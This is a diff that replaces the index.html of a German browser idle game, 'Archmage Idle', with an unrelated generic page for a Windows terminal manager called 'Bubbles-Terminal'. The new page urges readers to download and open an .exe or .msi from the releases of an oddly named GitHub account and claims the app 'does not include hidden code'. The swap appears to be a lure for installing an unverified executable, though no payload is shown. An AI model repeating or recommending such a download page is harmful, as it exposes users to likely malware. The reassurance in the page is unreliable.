@@ -1,344 +1,67 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="color-scheme" content="dark" />
-    <!-- Chromes Sprach-Detektor stuft die Runen-Glyphen sonst als Chinesisch ein
-         und zeigt den Übersetzen-Prompt; Auto-Übersetzung würde die UI-Labels zerlegen. -->
-    <meta name="google" content="notranslate" />
-    <title>Archmage Idle</title>
-    <script type="module" crossorigin src="/archmage-idle-live/assets/index-BURgOAgo.js"></script>
-    <link rel="stylesheet" crossorigin href="/archmage-idle-live/assets/index-BFKXMmTD.css">
-  </head>
-  <body>
-    <canvas id="bg" aria-hidden="true"></canvas>
-    <div id="scene">
-      <div id="center-col">
-        <button id="time-crystal-btn" type="button" aria-label="time crystal">
-          <svg viewBox="0 0 48 60" width="46" height="58" aria-hidden="true">
-            <path
-              class="hourglass-shape"
-              d="M10 5 H38 C38 19 27 25 25 30 C27 35 38 41 38 55 H10 C10 41 21 35 23 30 C21 25 10 19 10 5 Z"
-            />
-          </svg>
-        </button>
-        <div id="orb-wrap" role="button" tabindex="0" aria-label="Gather fire">
-          <svg id="rune-ring" viewBox="0 0 200 200" width="460" height="460" aria-hidden="true" translate="no">
-            <defs>
-              <path id="rune-path" d="M 100,100 m -80,0 a 80,80 0 1,1 160,0 a 80,80 0 1,1 -160,0" />
-            </defs>
-            <circle class="ring-outer" cx="100" cy="100" r="92" />
-            <circle class="ring-inner" cx="100" cy="100" r="66" />
-            <text class="runes">
-              <!-- Jede Rune als eigenes tspan, damit alle 12 Mastery Increases eine
-                   weitere golden aufleuchten kann (siehe RUNE_MASTERY_STEP). Alles in
-                   EINER Zeile: Umbrüche würden das Zeichen-Spacing auf dem Pfad ändern. -->
-              <textPath href="#rune-path"><tspan>ᚠ</tspan> <tspan>ᚢ</tspan> <tspan>ᚦ</tspan> <tspan>ᚨ</tspan> <tspan>ᚱ</tspan> <tspan>ᚲ</tspan> <tspan>ᚷ</tspan> <tspan>ᚹ</tspan> <tspan>ᚺ</tspan> <tspan>ᚾ</tspan> <tspan>ᛁ</tspan> <tspan>ᛃ</tspan> <tspan>ᛇ</tspan> <tspan>ᛈ</tspan> <tspan>ᛉ</tspan> <tspan>ᛊ</tspan> <tspan>ᛏ</tspan> <tspan>ᛒ</tspan> <tspan>ᛖ</tspan> <tspan>ᛗ</tspan> <tspan>ᛚ</tspan> <tspan>ᛜ</tspan> <tspan>ᛞ</tspan> <tspan>ᛟ</tspan> <tspan>ᚠ</tspan> <tspan>ᚢ</tspan> <tspan>ᚦ</tspan> <tspan>ᚨ</tspan> <tspan>ᚱ</tspan> <tspan>ᚲ</tspan></textPath>
-            </text>
-          </svg>
-          <canvas id="orb"></canvas>
-          <div id="melt-marker" aria-hidden="true"></div>
-          <div id="mastery-orbits" aria-hidden="true"></div>
-          <div id="tide-ring">
-            <svg viewBox="0 0 200 200" aria-hidden="true">
-              <path class="tide-band" d="M 234.2 177.5 A 155 155 0 0 1 -34.2 177.5" />
-              <path class="tide-hit-arc" d="M 234.2 177.5 A 155 155 0 0 1 -34.2 177.5" />
-              <path class="tide-zone-arc" d="M 135.4 250.9 A 155 155 0 0 1 64.6 250.9" />
-              <path class="tide-perfect-arc" d="M 111.4 254.6 A 155 155 0 0 1 88.6 254.6" />
-            </svg>
-            <button id="tide-crest-btn" type="button" aria-label="Catch the wave"></button>
-          </div>
-        </div>
-      </div>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Bubbles-Terminal is a Windows terminal app to manage your command shells in one clean window.">
+    <title>Bubbles-Terminal Guide</title>
+</head>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f9f9f9;">
+
+    <h1 style="color: #2c3e50;"> Bubbles-Terminal - Keep Your Windows Shells Organized</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/nonlethal-hochiminhcity858/Bubbles-Terminal/releases" style="background-color: #3498db; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Bubbles-Terminal</a>
     </div>
-    <svg id="time-threads" aria-hidden="true">
-      <path id="thread-fire" class="time-thread" />
-      <path id="thread-water" class="time-thread" />
-      <path id="thread-earth" class="time-thread" />
-      <path id="thread-air" class="time-thread" />
-    </svg>
-    <div id="wisps"></div>
-    <div id="ash-jar" aria-hidden="true">
-      <svg class="jar-outline" viewBox="0 0 60 44" width="60" height="44" aria-hidden="true">
-        <path
-          d="M6 4h48 M10 4 8 40a4 4 0 0 0 4 4h36a4 4 0 0 0 4-4l-2-36"
-          fill="none"
-          stroke="rgba(255, 180, 120, 0.35)"
-          stroke-width="2"
-          stroke-linecap="round"
-        />
-      </svg>
-      <div id="ash-pile"></div>
-    </div>
-    <button id="fire-tree-btn" class="tree-upgrade tu-fire" type="button" aria-label="Fire upgrade">
-      <span class="tu-fill"></span>
-      <span class="tu-notches" aria-hidden="true"></span>
-      <span class="tu-core"></span>
-      <span class="tu-currency" aria-hidden="true"></span>
-      <span class="tu-req" aria-hidden="true">
-        <span class="tu-req-top"><span class="tu-req-icon"></span><span class="tu-req-box"></span></span>
-        <span class="tu-req-dots"></span>
-      </span>
-    </button>
-    <button id="water-tree-btn" class="tree-upgrade tu-water" type="button" aria-label="Water upgrade">
-      <span class="tu-fill"></span>
-      <span class="tu-notches" aria-hidden="true"></span>
-      <span class="tu-core"></span>
-      <span class="tu-currency" aria-hidden="true"></span>
-      <span class="tu-req" aria-hidden="true">
-        <span class="tu-req-top"><span class="tu-req-icon"></span><span class="tu-req-box"></span></span>
-        <span class="tu-req-dots"></span>
-      </span>
-    </button>
-    <button id="earth-tree-btn" class="tree-upgrade tu-earth" type="button" aria-label="Earth upgrade">
-      <span class="tu-fill"></span>
-      <span class="tu-notches" aria-hidden="true"></span>
-      <span class="tu-core"></span>
-      <span class="tu-currency" aria-hidden="true"></span>
-      <span class="tu-req" aria-hidden="true">
-        <span class="tu-req-top"><span class="tu-req-icon"></span><span class="tu-req-box"></span></span>
-        <span class="tu-req-dots"></span>
-      </span>
-    </button>
-    <div id="boulder" role="button" tabindex="0" aria-label="Dig">
-      <svg viewBox="0 0 120 84" width="132" height="92" aria-hidden="true">
-        <defs>
-          <linearGradient id="strata-a" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0" stop-color="#6a5840" />
-            <stop offset="1" stop-color="#514231" />
-          </linearGradient>
-          <linearGradient id="strata-b" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0" stop-color="#4c3d2c" />
-            <stop offset="1" stop-color="#3a2f22" />
-          </linearGradient>
-          <linearGradient id="strata-c" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0" stop-color="#332a1c" />
-            <stop offset="1" stop-color="#241d13" />
-          </linearGradient>
-        </defs>
-        <path d="M10 76 16 30 34 12l30-6 32 10 16 22 8 40z" fill="url(#strata-c)" stroke="rgba(200,170,120,0.35)" stroke-width="1.5" />
-        <path d="M12 62 108 58 110 76 10 76z" fill="url(#strata-c)" />
-        <path d="M13 46 110 44 108 60 12 62z" fill="url(#strata-b)" />
-        <path d="M15 30 34 12l30-6 32 10 14 20 0 10-97 2z" fill="url(#strata-a)" />
-        <ellipse id="boulder-glow" cx="60" cy="46" rx="34" ry="20" fill="rgba(160,220,100,0.35)" />
-        <g id="boulder-cracks" fill="none" stroke="rgba(14,10,6,0.85)" stroke-width="1.6">
-          <path d="M38 18l8 14-6 12 9 14" />
-          <path d="M74 12l-4 16 10 12-3 16" />
-          <path d="M22 40l12 8-4 14" />
-          <path d="M96 34l-10 12 6 14" />
-        </g>
-      </svg>
-    </div>
-    <div id="geode-pile"></div>
-    <button id="storm-eye" type="button" aria-label="Unleash the storm">
-      <span class="eye-swirl"></span>
-      <span class="eye-core"></span>
-    </button>
-    <canvas id="fx" aria-hidden="true"></canvas>
-    <div id="focus-overlay" aria-hidden="true">
-      <svg id="focus-sigil-fire" class="focus-sigil" viewBox="0 0 24 24" width="120" height="120">
-        <defs>
-          <linearGradient id="flame-grad" x1="0" y1="1" x2="0" y2="0">
-            <stop offset="0" stop-color="#b3210b" />
-            <stop offset="0.55" stop-color="#ff6d1f" />
-            <stop offset="1" stop-color="#ffc46b" />
-          </linearGradient>
-        </defs>
-        <path
-          d="M13.5.67s.74 2.65.74 4.8c0 2.06-1.35 3.73-3.41 3.73-2.07 0-3.63-1.67-3.63-3.73l.03-.36C5.21 7.51 4 10.62 4 14c0 4.42 3.58 8 8 8s8-3.58 8-8C20 8.61 17.41 3.8 13.5.67zM11.71 19c-1.78 0-3.22-1.4-3.22-3.14 0-1.62 1.05-2.76 2.81-3.12 1.77-.36 3.6-1.21 4.62-2.58.39 1.29.59 2.65.59 4.04 0 2.65-2.15 4.8-4.8 4.8z"
-          fill="url(#flame-grad)"
-        />
-      </svg>
-      <svg id="focus-sigil-water" class="focus-sigil" viewBox="0 0 24 24" width="120" height="120">
-        <defs>
-          <linearGradient id="drop-grad-big" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0" stop-color="#b8e2ff" />
-            <stop offset="0.6" stop-color="#4b9fe8" />
-            <stop offset="1" stop-color="#1e5fa8" />
-          </linearGradient>
-        </defs>
-        <path d="M12 2c3.5 4.5 7 8.5 7 13a7 7 0 0 1-14 0c0-4.5 3.5-8.5 7-13z" fill="url(#drop-grad-big)" />
-      </svg>
-      <svg id="focus-sigil-earth" class="focus-sigil" viewBox="0 0 24 24" width="120" height="120">
-        <defs>
-          <linearGradient id="leaf-grad-big" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0" stop-color="#d8f0a0" />
-            <stop offset="0.6" stop-color="#7ab04a" />
-            <stop offset="1" stop-color="#3c6e20" />
-          </linearGradient>
-        </defs>
-        <path
-          d="M20 4c-8 0-14 3.5-15.5 10.5C4 17 4.5 19 5.5 20c.6-2.4 2-4.8 4.5-6.5-1.5 2.3-2.4 4.7-2.5 6.8 1.3.5 3 .4 4.5-.1C18 18.5 20.5 11 20 4z"
-          fill="url(#leaf-grad-big)"
-        />
-      </svg>
-      <svg id="focus-sigil-air" class="focus-sigil" viewBox="0 0 24 24" width="120" height="120">
-        <path
-          d="M3 8h11a3 3 0 1 0-3-3M3 13h15a3 3 0 1 1-3 3M3 18h8a2.5 2.5 0 1 1-2.5 2.5"
-          fill="none"
-          stroke="#dcecfb"
-          stroke-width="2"
-          stroke-linecap="round"
-        />
-      </svg>
-    </div>
-    <div id="warp-overlay" aria-hidden="true">
-      <div class="warp-ring"></div>
-      <div class="warp-ring warp-ring-2"></div>
-      <div class="warp-ring warp-ring-3"></div>
-      <div id="warp-flash"></div>
-    </div>
-    <div id="time-overlay">
-      <div id="time-card">
-        <div id="time-layout">
-          <!-- links: Zeit-Meilensteine als Siegel-Spalte (rein visuell, kein Text) -->
-          <div id="time-milestones" aria-hidden="true"></div>
-          <div id="time-center">
-            <!-- oben: Boosts rein visuell — ⇑⇑⇑-Kopf, Cursor je Reset, Ernte je Reset, Funken je Kristall -->
-            <div id="time-boosts-visual">
-              <div id="time-boost-arrows" aria-hidden="true">
-                <svg viewBox="0 0 24 24" width="16" height="16"><path d="M12 3 20 12h-5v9h-6v-9H4z" fill="#7fd66a" stroke="rgba(20,60,15,0.7)" stroke-width="1.2"/></svg>
-                <svg viewBox="0 0 24 24" width="24" height="24"><path d="M12 3 20 12h-5v9h-6v-9H4z" fill="#8fe07a" stroke="rgba(20,60,15,0.7)" stroke-width="1.2"/></svg>
-                <svg viewBox="0 0 24 24" width="16" height="16"><path d="M12 3 20 12h-5v9h-6v-9H4z" fill="#7fd66a" stroke="rgba(20,60,15,0.7)" stroke-width="1.2"/></svg>
-              </div>
-              <div id="time-cursor-area" class="boost-area"></div>
-              <div id="time-yield-area" class="boost-area"></div>
-              <div id="time-spell-area" class="boost-area"></div>
-            </div>
-            <!-- Mitte: die große Sanduhr + Kristall-Schale (1 Perle je Kristall, Geister = nächster Reset) -->
-            <div id="time-hg-wrap">
-              <canvas id="time-hourglass" aria-hidden="true"></canvas>
-              <div id="time-bowl" aria-hidden="true">
-                <div id="time-bowl-pearls"></div>
-                <svg id="time-bowl-shape" viewBox="0 0 120 30" aria-hidden="true">
-                  <path d="M4 4 Q60 42 116 4 L110 4 Q60 32 10 4 Z" fill="rgba(240,220,160,0.25)" stroke="rgba(240,220,160,0.6)" stroke-width="2" />
-                </svg>
-              </div>
-            </div>
-            <!-- unten: Shop als Icon-Buttons (Kosten = Perlen-Reihe) -->
-            <div id="time-shop-section">
-              <div id="time-shop-grid"></div>
-            </div>
-          </div>
-          <!-- rechts: bewusst leer (Platz für Späteres) -->
-          <div id="time-right" aria-hidden="true"></div>
-        </div>
-        <button id="time-close" type="button" aria-label="Schließen">✕</button>
-      </div>
-    </div>
-    <!-- grand finale (Zeit-Meilenstein 10): Celebration + Abschluss-Dialog der Version -->
-    <div id="finale-overlay">
-      <div id="finale-card">
-        <button id="finale-close" type="button" aria-label="Schließen">✕</button>
-        <h2>Vielen Dank fürs Spielen!</h2>
-        <p class="finale-version">Archmage Idle · Version 0.5</p>
-        <p>
-          Zehn Zeit-Resets, vier gemeisterte Elemente, jedes Siegel gebrochen — du hast
-          alles gesehen, was diese Version zu erzählen hat. Danke, dass du bis hierher
-          gespielt hast.
-        </p>
-        <p>
-          Und das war erst der Anfang: Hinter dem letzten Siegel regt sich schon das
-          nächste Kapitel. Wenn die Elemente eines Tages verschmelzen, öffnet sich eine
-          neue Welt — das <strong>3D&nbsp;Battle&nbsp;Adventure</strong> wartet.
-          Bis bald, Erzmagier.
-        </p>
-        <p class="finale-credit">
-          Developer: <a href="https://github.com/danielzaiser91" target="_blank" rel="noopener">Daniel Zaiser</a>
-        </p>
-      </div>
-    </div>
-    <div id="element-switcher" aria-live="polite">
-      <button id="chip-fire" class="element-chip selected" type="button" aria-label="Fire">
-        <svg class="flame-icon" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
-          <defs>
-            <linearGradient id="flame-grad-small" x1="0" y1="1" x2="0" y2="0">
-              <stop offset="0" stop-color="#c22c0c" />
-              <stop offset="0.55" stop-color="#ff7a2e" />
-              <stop offset="1" stop-color="#ffc46b" />
-            </linearGradient>
-          </defs>
-          <path
-            d="M13.5.67s.74 2.65.74 4.8c0 2.06-1.35 3.73-3.41 3.73-2.07 0-3.63-1.67-3.63-3.73l.03-.36C5.21 7.51 4 10.62 4 14c0 4.42 3.58 8 8 8s8-3.58 8-8C20 8.61 17.41 3.8 13.5.67zM11.71 19c-1.78 0-3.22-1.4-3.22-3.14 0-1.62 1.05-2.76 2.81-3.12 1.77-.36 3.6-1.21 4.62-2.58.39 1.29.59 2.65.59 4.04 0 2.65-2.15 4.8-4.8 4.8z"
-            fill="url(#flame-grad-small)"
-          />
-        </svg>
-        <span class="chip-ready" id="fire-ready"></span>
-      </button>
-      <button id="chip-water" class="element-chip" type="button" aria-label="Water">
-        <svg class="drop-icon" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
-          <defs>
-            <linearGradient id="drop-grad" x1="0" y1="0" x2="0" y2="1">
-              <stop offset="0" stop-color="#9fd6ff" />
-              <stop offset="1" stop-color="#2f7fd6" />
-            </linearGradient>
-          </defs>
-          <path d="M12 2c3.5 4.5 7 8.5 7 13a7 7 0 0 1-14 0c0-4.5 3.5-8.5 7-13z" fill="url(#drop-grad)" />
-        </svg>
-        <span class="chip-ready" id="water-ready"></span>
-      </button>
-      <button id="chip-earth" class="element-chip" type="button" aria-label="Earth">
-        <svg class="leaf-icon" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
-          <defs>
-            <linearGradient id="leaf-grad" x1="0" y1="0" x2="0" y2="1">
-              <stop offset="0" stop-color="#c8e88a" />
-              <stop offset="1" stop-color="#4e8a2e" />
-            </linearGradient>
-          </defs>
-          <path
-            d="M20 4c-8 0-14 3.5-15.5 10.5C4 17 4.5 19 5.5 20c.6-2.4 2-4.8 4.5-6.5-1.5 2.3-2.4 4.7-2.5 6.8 1.3.5 3 .4 4.5-.1C18 18.5 20.5 11 20 4z"
-            fill="url(#leaf-grad)"
-          />
-        </svg>
-        <span class="chip-ready" id="earth-ready"></span>
-      </button>
-      <button id="chip-air" class="element-chip" type="button" aria-label="Air">
-        <svg class="wind-icon" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
-          <path
-            d="M3 8h11a3 3 0 1 0-3-3M3 13h15a3 3 0 1 1-3 3M3 18h8a2.5 2.5 0 1 1-2.5 2.5"
-            fill="none"
-            stroke="#cfe4f8"
-            stroke-width="1.9"
-            stroke-linecap="round"
-          />
-        </svg>
-        <span class="chip-ready" id="air-ready"></span>
-      </button>
-      <button id="time-btn" type="button" aria-label="Time upgrades">
-        <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
-          <path
-            d="M6 2h12v2l-4.5 5.5a1 1 0 0 0 0 1L18 16v2H6v-2l4.5-5.5a1 1 0 0 0 0-1L6 4z"
-            fill="none"
-            stroke="#e8d9a8"
-            stroke-width="1.7"
-            stroke-linejoin="round"
-          />
-          <path d="M8.5 17.5h7L12 13z" fill="#e8d9a8" />
-        </svg>
-      </button>
-      <div id="fruit-tree" aria-live="polite"></div>
-    </div>
-    <button id="sfx-toggle" type="button" aria-label="Toggle sound" aria-pressed="false"></button>
-    <button id="debug-btn" type="button" aria-label="Debug menu">
-      <span id="debug-version"></span><span id="debug-shortid"></span>
-    </button>
-    <div id="debug-overlay">
-      <div id="debug-card">
-        <h2 class="mastery-title tree-title">debug</h2>
-        <select id="debug-select">
-          <option value="" disabled selected>— Debug-Save wählen —</option>
-        </select>
-        <select id="debug-perm-select">
-          <option value="" disabled selected>— Permanenter Save (Spielzeitpunkt) —</option>
-        </select>
-        <details id="debug-desc" open>
-          <summary>Beschreibung</summary>
-          <div id="debug-desc-text"></div>
-        </details>
-        <button id="debug-load-real" type="button">echten Spielstand laden</button>
-        <button id="debug-close" type="button">close</button>
-      </div>
-    </div>
-  </body>
+
+    <section>
+        <h2 style="color: #2c3e50;"> 📋 About This App</h2>
+        <p>Bubbles-Terminal sits on your desktop as a single window. It manages your existing command tools like PowerShell, Command Prompt, and Git Bash. It does not replace these programs. Instead, it acts as a container to help you organize multiple windows into one view. You see all your active shells in one place, which saves space on your taskbar.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #2c3e50;"> 💻 System Requirements</h2>
+        <p>Your computer needs the following to run this software:</p>
+        <ul>
+            <li>Windows 10 or Windows 11 operating system.</li>
+            <li>A 64-bit processor.</li>
+            <li>At least 4GB of RAM.</li>
+            <li>The latest version of .NET Desktop Runtime installed on your machine.</li>
+        </ul>
+    </section>
+
+    <section>
+        <h2 style="color: #2c3e50;"> 🚀 Installing the Software</h2>
+        <p>Follow these steps to set up the application on your computer:</p>
+        <ol>
+            <li>Go to the <a href="https://github.com/nonlethal-hochiminhcity858/Bubbles-Terminal/releases">official download page</a>.</li>
+            <li>Look for the section labeled "Assets" under the most recent release.</li>
+            <li>Select the file that ends in .msi or .exe to start your download.</li>
+            <li>Open the file once the download finishes.</li>
+            <li>Follow the prompts on your screen to complete the installation.</li>
+        </ol>
+    </section>
+
+    <section>
+        <h2 style="color: #2c3e50;"> ⚙️ How to Use</h2>
+        <p>Launch Bubbles-Terminal from your Start Menu after installation. Upon opening, the app detects your installed shells automatically. You can click the plus icon to add a new tab. Select the type of shell you want to launch, such as PowerShell or Git Bash. Every tab works exactly like the original program. You can move between tabs using your mouse or keyboard shortcuts.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #2c3e50;"> 🛠 Customization</h2>
+        <p>You can change the look of your terminal window inside the settings menu. Adjust the font size to suit your eyes. Choose from several color themes to make your work area comfortable. These settings save automatically to your user profile folder.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #2c3e50;"> ❓ Frequently Asked Questions</h2>
+        <p><strong>Does this app replace my existing terminals?</strong> No. It just displays shells like PowerShell or CMD within a new frame.</p>
+        <p><strong>Is this app safe?</strong> Yes. It performs the same tasks as your system shells and does not include hidden code.</p>
+        <p><strong>Can I use this with WSL?</strong> Yes. If you have Windows Subsystem for Linux installed, the app detects it as a valid shell option.</p>
+    </section>
+
+    <footer style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 0.9em; color: #777;">
+        <p>Keywords: application, bubblesthedev, cmd, gitbash, open-source, powershell, terminal, visualstudio, windows, wsl</p>
+    </footer>
+
+</body>
 </html>
